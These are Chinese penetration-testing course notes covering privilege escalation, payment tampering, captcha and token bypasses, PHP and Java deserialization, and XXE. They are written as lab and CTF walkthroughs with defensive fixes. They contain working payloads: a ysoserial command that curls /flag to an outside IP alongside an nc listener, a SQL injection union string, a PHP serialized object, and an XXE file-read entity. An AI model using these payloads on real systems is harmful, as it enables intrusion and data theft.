+<p>（WEB-INF/classes/com/wm/ctf/FlagController.class）</p>
+<p>涉及资源：</p>
+<p><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></p>
+<p><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=57475">https://www.ichunqiu.com/battalion?t=1&amp;r=57475</a></p>
+<p><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
+<p>[<a href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java]">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java]</a>(<a href="https://buuoj.cn/challenges#[RoarCTF">https://buuoj.cn/challenges#[RoarCTF</a> 2019]Easy Java)</p>
+<p>DAY-33 WEB漏洞-逻辑越权之水平垂直越权全解</p>
+<p>2022年9月7日</p>
+<p>19:49</p>
+<p><img src="/file6280.files/image032.png" alt="img"></p>
+<p><img src="/file6280.files/image033.png" alt="img"></p>
+<h1 id="水平，垂直越权，未授权访问"><a href="#水平，垂直越权，未授权访问" class="headerlink" title="#水平，垂直越权，未授权访问"></a>#水平，垂直越权，未授权访问</h1><p><strong>解释，原理，检测，利用，防御等</strong></p>
+<p>通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B 账号数据。</p>
+<p>使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。</p>
+<p>通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。</p>
+<p>原理：</p>
+<p>前端安全造成：界面</p>
+<p>判断用户等级后，代码界面部分进行可选显示</p>
+<p>后盾安全造成：数据库</p>
+<p>user  表(管理员和普通用户同表)</p>
+<p>id,username,password,usertype</p>
+<p>1,admin,123456,1</p>
+<p>2,xiaodi,11111,2</p>
+<p>登录用户 admin 或 xiaodi 时，代码是如何验证这个级别？（usertype 判断）</p>
+<p>如果在访问数据包中有传输用户的编号、用户组编号或类型编号的时候，那么尝试对这个值进行修</p>
+<p>改，就是测试越权漏洞的基本。</p>
+<h1 id="修复防御方案"><a href="#修复防御方案" class="headerlink" title="#修复防御方案"></a>#修复防御方案</h1><p>1.前后端同时对用户输入信息进行校验，双重验证机制</p>
+<p>2.调用功能前验证用户是否有权限调用相关功能</p>
+<p>3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</p>
+<p>4.直接对象引用的加密资源 ID，防止攻击者枚举 ID，敏感数据特殊化处理</p>
+<p>5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
+<h1 id="演示案例：-3"><a href="#演示案例：-3" class="headerlink" title="演示案例："></a>演示案例：</h1><p>Ø  Pikachu-本地水平垂直越权演示（漏洞成因）</p>
+<p><em>Ø</em> <em>墨者水平</em>*-*<em>身份认证失效漏洞实战（漏洞成因）</em></p>
+<p>Ø 越权检测 -小米范越权漏洞检测工具（工具使用）</p>
+<p>Ø  越权检测-Burpsuite <strong>插件</strong> <strong>Authz</strong> 安装测试（插件使用）</p>
+<h1 id="涉及资源：-2"><a href="#涉及资源：-2" class="headerlink" title="涉及资源："></a>涉及资源：</h1><p><a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a></p>
+<p><a href="http://pan.baidu.com/s/1pLjaQKF">http://pan.baidu.com/s/1pLjaQKF</a>  (privilegechecker)</p>
+<p><a href="https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe</a></p>
+<p>DAY-34 WEB 漏洞-逻辑越权之支付数据篡改安全</p>
+<p>2022年9月7日</p>
+<p>22:25</p>
+<h1 id="登录应用功能点安全问题"><a href="#登录应用功能点安全问题" class="headerlink" title="#登录应用功能点安全问题"></a>#登录应用功能点安全问题</h1><p>检测功能点，检测，危害，修复方案等</p>
+<p>1.登录点暴力破解</p>
+<p>2.HTTP/HTTPS 传输</p>
+<p>3.Cookie 脆弱点验证</p>
+<p>4.Session 固定点测试</p>
+<p>5.验证密文比对安全测试</p>
+<h1 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="#数据篡改安全问题"></a>#数据篡改安全问题</h1><p>原理，检测，危害，修复等</p>
+<p>参考：<a href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a></p>
+<p>#商品购买流程：</p>
+<p>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p>
+<p>#常见篡改参数：</p>
+<p>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等</p>
+<p>#常见修改方法：</p>
+<p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p>
+<p>6000  大米测试产品</p>
+<p>/index.php?m=Member&amp;a=gobuy&amp;iscart=0&amp;id=127&amp;name=%E5%A4%A7%E7%B1%B3%E6%B5%8B%E8%</p>
+<p>AF%95%E4%BA%A7%E5%93%81&amp;qty=1&amp;price=6000&amp;gtype=%E7%81%B0%E8%89%B2&amp;pic=/Public/Uplo</p>
+<p>ads/thumb/thumb_1393218295.jpg</p>
+<p>5400  大米手机 cms</p>
+<p>/index.php?m=Member&amp;a=gobuy&amp;iscart=0&amp;id=70&amp;name=%E5%A4%A7%E7%B1%B3%E6%89%8B%E6%9</p>
+<p>C%BACMS&amp;qty=2&amp;price=5400&amp;gtype=%E7%81%B0%E8%89%B2&amp;pic=/Public/Uploads/thumb/thumb_13</p>
+<p>93218295.jpg</p>
+<p>index.php?s=/wap/pay/wchatQrcodePay 微信支付</p>
+<p>index.php?s=/wap/pay/alipay 支付宝支付</p>
+<p>index.php?s=<a href="http://www.xiaodi8.com/alipay">http://www.xiaodi8.com/alipay</a>  调用其他的支付接口</p>
+<p>$pay_name=$_GET[‘s’];</p>
+<p>6000  是存储到数据库里，安全的做法：以数据库的数据值为准</p>
+<h1 id="演示案例：-4"><a href="#演示案例：-4" class="headerlink" title="演示案例："></a>演示案例：</h1><p>Ø  HTTP/HTTPS 协议密文抓取</p>
+<p>Ø  后台登录帐号密码爆破测试</p>
+<p>Ø  Cookie 脆弱点验证修改测试</p>
+<p>Ø  某商场系统商品支付逻辑测试-数量,订单</p>
+<p>Ø  某建站系统商品支付逻辑测试-价格,商品</p>
+<h1 id="涉及资源：-3"><a href="#涉及资源：-3" class="headerlink" title="涉及资源："></a>涉及资源：</h1><p><a href="https://www.zblogcn.com/zblogphp/">https://www.zblogcn.com/zblogphp/</a></p>
+<p><a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a></p>
+<p><a href="https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg">https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg</a> 提取码：xiao</p>
+<p><a href="https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg">https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg</a> 提取码：xiaO</p>
+<p>DAY-35 WEB 漏洞-逻辑越权之找回机制及接口爆破</p>
+<p>2022年9月7日</p>
+<p>22:26</p>
+<h1 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="#找回重置机制"></a>#找回重置机制</h1><p>客户端回显，Response 状态值，验证码爆破，找回流程绕过等</p>
+<h1 id="接口调用乱用"><a href="#接口调用乱用" class="headerlink" title="#接口调用乱用"></a>#接口调用乱用</h1><p>短信轰炸，来电轰炸等</p>
+<h1 id="演示案例：-5"><a href="#演示案例：-5" class="headerlink" title="演示案例："></a>演示案例：</h1><p>l  找回密码验证码逻辑-爆破测试-实例</p>
+<p>l  墨者靶场密码重置-验证码套用-靶场</p>
+<p>l  手机邮箱验证码逻辑-客户端回显-实例</p>
+<p>l  绑定手机验证码逻辑-Rep 状态值篡改-实例</p>
+<p>l  某 APP 短信轰炸接口乱用-实例接口调用发包</p>
+<h1 id="涉及资源：-4"><a href="#涉及资源：-4" class="headerlink" title="涉及资源："></a>涉及资源：</h1><p><a href="http://downcode.com/downcode/j_16621.shtml">http://downcode.com/downcode/j_16621.shtml</a></p>
+<p><a href="https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg">https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg</a> 提取码：xiao</p>
+<p><a href="https://pan.baidu.com/s/1N963jFjTefNc6Gnso-RHmw">https://pan.baidu.com/s/1N963jFjTefNc6Gnso-RHmw</a> 提取码：xiao</p>
+<p><a href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe</a></p>
+<p>DAY-36 WEB 漏洞-逻辑越权之验证码与 Token 及接口</p>
+<p>2022年9月7日</p>
+<p>22:27</p>
+<h1 id="验证码安全"><a href="#验证码安全" class="headerlink" title="#验证码安全"></a>#验证码安全</h1><p>分类：图片，手机或邮箱，语音，视频，操作等</p>
+<p>原理：验证生成或验证过程中的逻辑问题</p>
+<p>危害：账户权限泄漏，短信轰炸，遍历，任意用户操作等</p>
+<p>漏洞：客户端回显(已讲)，验证码复用，验证码爆破(已讲)，绕过等</p>
+<h1 id="token-安全"><a href="#token-安全" class="headerlink" title="#token 安全"></a>#token 安全</h1><p>基本上述同理，主要是验证中可存在绕过可继续后续测试</p>
+<p>token  爆破，token 客户端回显等</p>
+<h1 id="验证码识别插件工具使用"><a href="#验证码识别插件工具使用" class="headerlink" title="#验证码识别插件工具使用"></a>#验证码识别插件工具使用</h1><p>captcha-killer，Pkav_Http_Fuzz,reCAPTCHA 等</p>
+<h1 id="接口安全问题"><a href="#接口安全问题" class="headerlink" title="#接口安全问题"></a>#接口安全问题</h1><p>调用，遍历，未授权，篡改等</p>
+<p>调用案例：短信轰炸</p>
+<p>遍历案列：UID 等遍历</p>
+<p>callback 回调 JSONP</p>
+<p>参数篡改：墨者靶场</p>
+<p>水平越权：</p>
+<p>xiaodi uid=10</p>
+<p>1-1000 尝试能不能获取到其他编号对应的用户信息</p>
+<p>未授权访问：</p>
+<p>与越权漏洞区别</p>
+<p>Jboss  未授权访问</p>
+<p>Jenkins 未授权访问</p>
+<p>ldap  未授权访问</p>
+<p>Redis  未授权访问</p>
+<p>elasticsearch 未授权访问</p>
+<p>MenCache 未授权访问</p>
+<p>Mongodb 未授权访问</p>
+<p>Rsync  未授权访问</p>
+<p>Zookeeper 未授权访问</p>
+<p>Docker 未授权访问</p>
+<h1 id="更多细节见笔记文档打包的-PDF"><a href="#更多细节见笔记文档打包的-PDF" class="headerlink" title="#更多细节见笔记文档打包的 PDF"></a>#更多细节见笔记文档打包的 PDF</h1><p>Web  攻防之业务安全实战指南</p>
+<p>未授权访问漏洞集合带环境及解题</p>
+<h1 id="涉及案例："><a href="#涉及案例：" class="headerlink" title="涉及案例："></a>涉及案例：</h1><p>Ø  验证码识别插件及工具操作演示-实例</p>
+<p>Ø  验证码绕过本地及远程验证-本地及实例</p>
+<p>Ø  Token 客户端回显绕过登录爆破演示-本地</p>
+<p>Ø  某 URL 下载接口 ID 值调用遍历测试-实例</p>
+<p>Ø  Callback 自定义返回调用安全-漏洞测试-实例</p>
+<p>Ø  补：上述在实战中如何做到漏洞发现-bp 功能点</p>
+<h1 id="涉及资源：-5"><a href="#涉及资源：-5" class="headerlink" title="涉及资源："></a>涉及资源：</h1><p><a href="https://www.lanzous.com/i1z2s3e">https://www.lanzous.com/i1z2s3e</a></p>
+<p><a href="https://www.cnblogs.com/nul1/p/12071115.html">https://www.cnblogs.com/nul1/p/12071115.html</a></p>
+<p><a href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2</a></p>
+<p><a href="https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0">https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0</a></p>
+<p>DAY-37 WEB 漏洞-反序列化之 PHP&amp;JAVA 全解(上)</p>
+<p>2022年9月10日</p>
+<p>10:11</p>
+<h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="#PHP 反序列化"></a>#PHP 反序列化</h1><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码</p>
+<p>执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行</p>
+<p>反序列化的时候就有可能会触发对象中的一些魔术方法。</p>
+<p>**serialize() //**<strong>将一个对象转换成一个字符串</strong></p>
+<p>**unserialize() //**<strong>将字符串还原成一个对象</strong></p>
+<p>触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p>
+<p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
+<p>__construct()//创建对象时触发</p>
+<p>__destruct() //对象被销毁时触发</p>
+<p>__call() //在对象上下文中调用不可访问的方法时触发</p>
+<p>__callStatic() //在静态上下文中调用不可访问的方法时触发</p>
+<p>__get() //用于从不可访问的属性读取数据</p>
+<p>__set() //用于将数据写入不可访问的属性</p>
+<p>__isset() //在不可访问的属性上调用 isset()或 empty()触发</p>
+<p>__unset() //在不可访问的属性上使用 unset()时触发</p>
+<p>__invoke() //当脚本尝试将对象调用为函数时触发</p>
+<h1 id="演示案例：-6"><a href="#演示案例：-6" class="headerlink" title="演示案例："></a>演示案例：</h1><p>Ø  先搞一把 PHP 反序列化热身题稳住-无类问题-本地</p>
+<p>Ø  在撸一把 CTF 反序列化小真题压压惊-无类执行-实例</p>
+<p>Ø  然后抗一把 CTF 反序列化练习题围观下-有类魔术方法触发-本地</p>
+<p>Ø  最后顶一把网鼎杯 2020 青龙大真题舒服下-有类魔术方法触发-实例</p>
+<p>首先 ctf 命名及代码函数 unserialize 判断反序列化知识点</p>
+<p>第一：获取 flag 存储 flag.php</p>
+<p>第二：两个魔术方法__destruct __construct</p>
+<p>第三：传输 str 参数数据后触发 destruct，存在 is_valid 过滤</p>
+<p>第四：__destruct 中会调用 process,其中 op=1 写入及 op=2 读取</p>
+<p>第五：涉及对象 FileHandler，变量 op 及 filename,content，进行构造输出</p>
+<!--?php
+
+class  FileHandler{
+
+public $op=' 2';//源码告诉我们 op 为 1 时候是执行写入为 2 时执行读
+
+public $filename="flag.php";//文件开头调用的是 flag.php
+
+public  $content="xd";
+
+}
+
+$flag = new  FileHandler();
+
+$flag_1 =  serialize($flag);
+
+echo $flag_1;
+
+?-->
+
+<p>涉及：反序列化魔术方法调用，弱类型绕过，ascii 绕过</p>
+<p>使用该类对 flag 进行读取，这里面能利用的只有__destruct 函数（析构函数）。__destruct 函数对</p>
+<p>$this-&gt;op 进行了===判断并内容在 2 字符串时会赋值为 1，process 函数中使用==对$this-&gt;op 进行判</p>
+<p>断（为 2 的情况下才能读取内容），因此这里存在弱类型比较，可以使用数字 2 或字符串’ 2’绕过判断。</p>
+<p>is_valid 函数还对序列化字符串进行了校验，因为成员被 protected 修饰，因此序列化字符串中会出</p>
+<p>现 ascii 为 0 的字符。经过测试，在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后</p>
+<p>成员也会被 public 覆盖修饰。</p>
+<p>涉及资源：</p>
+<p><a href="http://www.dooccn.com/php/">http://www.dooccn.com/php/</a></p>
+<p><a href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a></p>
+<p><a href="https://ctf.bugku.com/challenges#flag.php">https://ctf.bugku.com/challenges#flag.php</a></p>
+<p><a href="https://cgctf.nuptsast.com/challenges#Web">https://cgctf.nuptsast.com/challenges#Web</a></p>
+<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
+<p>DAY-38 WEB 漏洞-反序列化之 PHP&amp;JAVA 全解(下)</p>
+<p>2022年9月10日</p>
+<p>10:13</p>
+<p>#序列化和反序列化</p>
+<p>序列化 (Serialization)：将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对</p>
+<p>象将其当前状态写入到临时或持久性存储区。</p>
+<p>反序列化：从存储区中读取该数据，并将其还原为对象的过程，称为反序列化。</p>
+<p>演示案例：</p>
+<p>Ø  Java 反序列化及命令执行代码测试</p>
+<p>Ø  WebGoat_Javaweb 靶场反序列化测试</p>
+<p>java -Dhibernate5  -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1.jar</p>
+<p>ysoserial.GeneratePayload  Hibernate1 calc.exe &gt; payload.bin</p>
+<p>Ø  2020-网鼎杯-朱雀组-Web-think_java 真题复现</p>
+<p><img src="/file6280.files/image041.png" alt="img"></p>
+<p>0x01  注入判断，获取管理员帐号密码：</p>
+<p>根据提示附件进行 javaweb 代码审计，发现可能存在注入漏洞</p>
+<p>另外有 swagger 开发接口，测试注入漏洞及访问接口进行调用测试</p>
+<p>数据库名：myapp,列名 name,pwd</p>
+<p>注入测试：</p>
+<p>POST  /common/test/sqlDict</p>
+<p>dbName=myapp?a=’  union select (select pwd from user)#</p>
+<p>0x02  接口测试</p>
+<p>/swagger-ui.html 接口测试：</p>
+<p>{</p>
+<p>“password”:”ctfhub_29588_13038”,</p>
+<p>“username”:  “ctfhub”</p>
+<p>}</p>
+<p>登录成功返回数据：</p>
+<p>{</p>
+<p>“data”:  “Bearer</p>
+<p>rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZ</p>
+<p>y9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMj</p>
+<p>yPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABmN0Zm</p>
+<p>h1Yg==”,</p>
+<p>“msg”: “登录成功”,</p>
+<p>“status”: 2,</p>
+<p>“timestamps”:  1594549037415</p>
+<p>}</p>
+<p>0x03  回显数据分析攻击思路</p>
+<p>JAVAWEB 特征可以作为序列化的标志参考:</p>
+<p>一段数据以 rO0AB 开头，你基本可以确定这串就是 JAVA 序列化 base64 加密的数据。</p>
+<p>或者如果以 aced 开头，那么他就是这一段 java 序列化的 16 进制。</p>
+<p>分析数据：</p>
+<p>先利用 py2 脚本 base64 解密数据</p>
+<p>import base64</p>
+<p>a =</p>
+<p>“rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFu</p>
+<p>Zy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDM</p>
+<p>jyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkb</p>
+<p>Wlu”</p>
+<p>b =  base64.b64decode(a).encode(‘hex’)</p>
+<p>print(b)</p>
+<p>再利用 SerializationDumper 解析数据</p>
+<p>java  -jar SerializationDumper.jar base64 后的数据</p>
+<p>0x04  生成反序列化 payload</p>
+<p>解密后数据中包含帐号等信息，通过接口/common/user/current 分析可知数据有接受，说明存在反</p>
+<p>序列化操作，思路：将恶意代码进行序列化后进行后续操作</p>
+<p>利用 ysoserial 进行序列化生成</p>
+<p>java -jar  ysoserial-master-30099844c6-1.jar ROME “curl <a href="http://47.75.212.155:4444/">http://47.75.212.155:4444</a> -d @/flag” &gt;  xiaodi.bin</p>
+<p>利用 py2 脚本进行反序列化数据的提取</p>
+<p>import base64</p>
+<p>file =  open(“xiaodi.bin”,”rb”)</p>
+<p>now =  file.read()</p>
+<p>ba =  base64.b64encode(now)</p>
+<p>print(ba)</p>
+<p>file.close()</p>
+<p>0x05  触发反序列化，获取 flag</p>
+<p>服务器执行：nc -lvvp 4444</p>
+<p>数据包直接请求获取进行反序列数据加载操作</p>
+<p>涉及资源：</p>
+<p><a href="https://github.com/frohoff/ysoserial/releases">https://github.com/frohoff/ysoserial/releases</a></p>
+<p><a href="https://github.com/WebGoat/WebGoat/releases">https://github.com/WebGoat/WebGoat/releases</a></p>
+<p><a href="https://github.com/NickstaDB/SerializationDumper/releases/tag/1">https://github.com/NickstaDB/SerializationDumper/releases/tag/1</a>.</p>
+<p>12</p>
+<p>import base64</p>
+<p>c=open(“payload.bin”,”rb”).read()</p>
+<p>cc=base64.urlsafe_b64encode(c)</p>
+<p>open(“payload.txt”,”wt”,ecoding=”utf-8”).write(cc.decode())</p>
+<h3 id="DAY-39-WEB漏洞-XXE-amp-XML之利用检测绕过全解"><a href="#DAY-39-WEB漏洞-XXE-amp-XML之利用检测绕过全解" class="headerlink" title="DAY-39 WEB漏洞-XXE&amp;XML之利用检测绕过全解"></a>DAY-39 WEB漏洞-XXE&amp;XML之利用检测绕过全解</h3><p>XML被设计为<strong>传输和存储数据</strong></p>
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具</p>
+<p>XXE漏洞全称XMLExternal Entity Injection，即<strong>xml外部实体注入漏洞</strong></p>
+<p>XXE漏洞发生在应用程序<strong>解析XML输入</strong>时，没有禁止外部实体的加载，导致可加载</p>
+<p>恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">- XML与HTML的主要差异
+
+XML被设计为传输和存储数据，其焦点是数据的内容。
+HTML被设计用来显示数据，其焦点是数据的外观。
+HTML旨在显示信息 ，而XML旨在传输信息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>XML示例代码：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--XML 声明--&gt;</span>
+<span class="token prolog">&lt;?xml  version="1.0"?&gt;</span>
+<span class="token comment">&lt;!--文档类型定义--&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!DOCTYPE</span> <span class="token attr-name">note</span> <span class="token attr-name">[</span> <span class="token attr-name">&lt;!--定义此文档是</span> <span class="token attr-name">note</span> <span class="token attr-name">类型的文档--</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from,heading,body)</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!--定义 note 元素有四个元素--&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!--定义 to 元素为”#PCDATA”类型--&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!--定义 from 元素为”#PCDATA”类型--&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!--定义 head 元素为”#PCDATA”类型--&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!--定义 body 元素为”#PCDATA”类型--&gt;</span>
+]]]&gt;
+<span class="token comment">&lt;!--文档元素--&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">&gt;</span></span>Dave<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">&gt;</span></span>Tom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>You  are a good man<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>XML包括XML声明、DTD文档类型定义、文档元素</p>
+<ul>
+<li>DTD</li>
+</ul>
+<p>文档类型定义（DTD）可定义合法的XML文档构建模块</p>
+<p>它使用一系列合法的元素来定义文档的结构</p>
+<p>DTD可被成行地声明于XML文档中，也可作为一个外部引用</p>
+<p>（1）内部的 DOCTYPE 声明</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token punctuation">[</span><span class="token internal-subset">元素声明</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>（2）外部文档声明</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token name">SYSTEM</span> <span class="token name">”文件名”</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>DTD实体</li>
+</ul>
+<p>（1）内部实体声明</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">实体名称</span> <span class="token attr-name">”实体的值"</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>（2）外部实体声明</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">实体名称</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">”URI"</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>（3）参数实体声明</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%实体名称</span> <span class="token attr-name">”实体的值"</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%实体名称</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">”URI"</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>#xxe  漏洞修复与防御方案-php,java,python-过滤及禁用</p>
+<p>#方案 1-禁用外部实体</p>
+<p>PHP:</p>
+<p>libxml_disable_entity_loader(true);</p>
+<p>JAVA:</p>
+<p>DocumentBuilderFactory  dbf</p>
+<p>=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p>
+<p>Python：</p>
+<p>from lxml import  etreexmlData =  etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
+<p>#方案 2-过滤用户提交的 XML 数据</p>
+<p>过滤关键词：&lt;!DOCTYPE 和&lt;!ENTITY，或者 SYSTEM 和 PUBLIC</p>
+<h4 id="涉及案例：-1"><a href="#涉及案例：-1" class="headerlink" title="涉及案例："></a>涉及案例：</h4><p>pikachu靶场xml数据传输测试-回显,玩法,协议,引入</p>
+<p><img src="http://image.kmoon.fun//images/202210281910803.png" alt="image-20221028191018572"></p>
+<p><strong>#玩法-读文件</strong></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">
+	&lt;!ENTITY xxe  SYSTEM "file:///d:/test.txt"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>#玩法-内网探针或攻击内网应用（触发漏洞地址）</strong></p>
+<p>端口扫描：若开放回显快 未开放回显慢</p>
